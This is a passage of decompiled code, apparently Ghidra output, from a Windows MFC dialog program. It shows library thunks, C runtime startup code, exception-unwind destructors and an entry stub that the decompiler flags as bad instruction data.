  pHVar1 = AfxFindResourceHandle(param_1,param_2);
  return pHVar1;
}



int __thiscall
CListCtrl::SetItem(CListCtrl *this,int param_1,int param_2,uint param_3,char *param_4,int param_5,
                  uint param_6,uint param_7,long param_8)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404562. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetItem(this,param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  return iVar1;
}



int __thiscall
CListCtrl::InsertItem
          (CListCtrl *this,uint param_1,int param_2,char *param_3,uint param_4,uint param_5,
          int param_6,long param_7)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404568. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertItem(this,param_1,param_2,param_3,param_4,param_5,param_6,param_7);
  return iVar1;
}



void __cdecl FUN_00404580(_onexit_t param_1)

{
  if (DAT_00407710 == -1) {
    _onexit(param_1);
    return;
  }
  __dllonexit(param_1,&DAT_00407710,&DAT_0040770c);
  return;
}



int __cdecl FUN_004045ac(_onexit_t param_1)

{
  int iVar1;
  
  iVar1 = FUN_00404580(param_1);
  return (iVar1 != 0) - 1;
}



void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004045be. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004045c4. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_004045d0(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404600. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcpy(_Dest,_Source);
  return pcVar1;
}



void _ftol(void)

{
                    // WARNING: Could not recover jumptable at 0x00404606. Too many branches
                    // WARNING: Treating indirect jump as call
  _ftol();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040460c(void)

{
  undefined4 *puVar1;
  uint uVar2;
  HMODULE pHVar3;
  byte *pbVar4;
  HINSTANCE__ *pHVar5;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00405ad0;
  puStack_10 = &DAT_00404792;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_0040770c = 0xffffffff;
  DAT_00407710 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_00407700;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_004076fc;
  _DAT_00407708 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_00404791();
  if (DAT_004075f0 == 0) {
    __setusermatherr(&LAB_0040478e);
  }
  FUN_0040477c();
  _initterm(&DAT_0040701c,&DAT_00407020);
  local_70.newmode = DAT_004076f8;
  __getmainargs(&local_64,&local_74,&local_68,DAT_004076f4,&local_70);
  _initterm(&DAT_00407000,&DAT_00407018);
  pbVar4 = *(byte **)_acmdln_exref;
  if (*pbVar4 != 0x22) {
    do {
      if (*pbVar4 < 0x21) goto LAB_004046ff;
      pbVar4 = pbVar4 + 1;
    } while( true );
  }
  do {
    pbVar4 = pbVar4 + 1;
    if (*pbVar4 == 0) break;
  } while (*pbVar4 != 0x22);
  if (*pbVar4 != 0x22) goto LAB_004046ff;
  do {
    pbVar4 = pbVar4 + 1;
LAB_004046ff:
  } while ((*pbVar4 != 0) && (*pbVar4 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    uVar2 = 10;
  }
  else {
    uVar2 = (uint)local_60.wShowWindow;
  }
  pHVar5 = (HINSTANCE__ *)0x0;
  pHVar3 = GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_0040479e(pHVar3,pHVar5,(char *)pbVar4,uVar2);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



void __dllonexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0040476a. Too many branches
                    // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00404776. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void FUN_0040477c(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



void FUN_00404791(void)

{
  return;
}



uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404798. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}



void FUN_0040479e(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  AfxWinMain(param_1,param_2,param_3,param_4);
  return;
}



undefined4 FUN_004047b6(int param_1,undefined4 param_2)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  pAVar1[0x14] = SUB41(param_1,0);
  *(undefined4 *)(pAVar1 + 0x1040) = param_2;
  if (param_1 == 0) {
    _setmbcp(-3);
  }
  return 1;
}



int AfxWinMain(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004047f6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxWinMain(param_1,param_2,param_3,param_4);
  return iVar1;
}



void Unwind_00404800(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_00404809(void)

{
  int unaff_EBP;
  
  CEdit::~CEdit((CEdit *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_00404815(void)

{
  int unaff_EBP;
  
  CEdit::~CEdit((CEdit *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_0040482e(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x18));
  return;
}



void Unwind_00404837(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x20));
  return;
}



void Unwind_00404840(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_00404860(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_00404869(void)

{
  int unaff_EBP;
  
  CEdit::~CEdit((CEdit *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_00404875(void)

{
  int unaff_EBP;
  
  CEdit::~CEdit((CEdit *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_00404890(void)

{
  int unaff_EBP;
  
  FUN_00402630((CDialog *)(unaff_EBP + -300));
  return;
}



void Unwind_004048b0(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_004048b9(void)

{
  int unaff_EBP;
  
  CButton::~CButton((CButton *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_004048c5(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_004048e0(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_004048e9(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_004048ff(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_00404908(void)

{
  int unaff_EBP;
  
  CButton::~CButton((CButton *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_00404914(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_00404923(void)

{
  int unaff_EBP;
  
  FUN_004038f7((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0xe4));
  return;
}



void Unwind_0040493c(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_00404945(void)

{
  int unaff_EBP;
  
  FUN_00401840(*(void **)(unaff_EBP + -0x24));
  return;
}



void Unwind_00404959(void)

{
  int unaff_EBP;
  
  FUN_00403340((CDialog *)(unaff_EBP + -0x70));
  return;
}



void Unwind_0040496c(void)

{
  int unaff_EBP;
  
  CPaintDC::~CPaintDC((CPaintDC *)(unaff_EBP + -0x7c));
  return;
}



void Unwind_0040497f(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x34));
  return;
}



void Unwind_00404988(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x9c));
  return;
}



void Unwind_004049a0(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



// WARNING: Control flow encountered bad instruction data

void entry(void)

{
  char cVar1;
  char *pcVar2;
  
  pcVar2 = (char *)FUN_0040460c();
  cVar1 = (char)pcVar2;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
  *pcVar2 = *pcVar2 + cVar1;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}


